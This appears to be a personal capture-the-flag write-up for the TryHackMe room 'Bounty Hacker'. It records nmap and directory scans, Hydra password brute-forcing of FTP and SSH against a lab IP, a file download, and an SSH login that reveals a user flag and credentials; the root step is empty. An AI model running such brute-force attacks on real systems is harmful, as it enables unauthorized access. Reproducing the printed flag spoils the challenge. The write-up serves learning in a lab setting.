# Bounty Hacker

IP: 10.10.0.34

1. Nmap Scan

    * Open Ports:

```
21 -- ftp
22 -- ssh
80 -- webpage
```

2. Dirbuster Scan

    * Directories found:

```
/images
/icons -- 404
/icons/small -- 403
```

3. Enum4linux

```
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

4. Hydra on user *ftp* 
```bash
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://10.10.0.34

[21][ftp] host: 10.10.0.34   login: ftp   password: 123456
[21][ftp] host: 10.10.0.34   login: ftp   password: 12345
[21][ftp] host: 10.10.0.34   login: ftp   password: 123456789
[21][ftp] host: 10.10.0.34   login: ftp   password: 1234567
[21][ftp] host: 10.10.0.34   login: ftp   password: babygirl
[21][ftp] host: 10.10.0.34   login: ftp   password: monkey
[21][ftp] host: 10.10.0.34   login: ftp   password: jessica                                   
[21][ftp] host: 10.10.0.34   login: ftp   password: password                                  
[21][ftp] host: 10.10.0.34   login: ftp   password: iloveyou                                  
[21][ftp] host: 10.10.0.34   login: ftp   password: princess                                  
[21][ftp] host: 10.10.0.34   login: ftp   password: rockyou                                   
[21][ftp] host: 10.10.0.34   login: ftp   password: 12345678                                  
[21][ftp] host: 10.10.0.34   login: ftp   password: abc123
[21][ftp] host: 10.10.0.34   login: ftp   password: nicole
[21][ftp] host: 10.10.0.34   login: ftp   password: daniel
[21][ftp] host: 10.10.0.34   login: ftp   password: lovely
```

5. Ftp -- transfering over target's files
```
ftp> open
(to) 10.10.0.34
ftp> user
(username) ftp
ftp> get
(remote-file) task.txt
(local-file) task.txt
ftp> get
(remote-file) locks.txt
(local-file) locks.txt
```

6. Hydra on user *lin* for SSH credentials

    - ssh -- lin:RedDr4gonSynd1cat3
```
hydra -l lin -P locks.txt 10.10.0.34 -t 4 ssh

[22][ssh] host: 10.10.0.34   login: lin   password: RedDr4gonSynd1cat3
```

7. SSH into the machine and user flag found

    - user flag -- THM{CR1M3_SyNd1C4T3}
```
ssh lin@10.10.0.34
ls
cat user.txt

THM{CR1M3_SyNd1C4T3}
```

8. root access


---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
